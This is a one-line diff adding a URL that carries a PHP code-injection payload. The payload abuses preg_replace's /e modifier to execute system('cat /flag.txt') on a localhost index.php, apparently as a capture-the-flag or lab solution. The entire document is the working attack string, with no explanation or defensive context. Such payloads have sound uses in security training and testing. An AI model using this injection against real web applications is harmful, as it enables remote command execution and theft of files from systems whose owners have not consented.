@@ -1,0 +1,1 @@
+http://localhost/index.php?pat=/a/e&rep=system('cat%20/flag.txt');&sub=abc
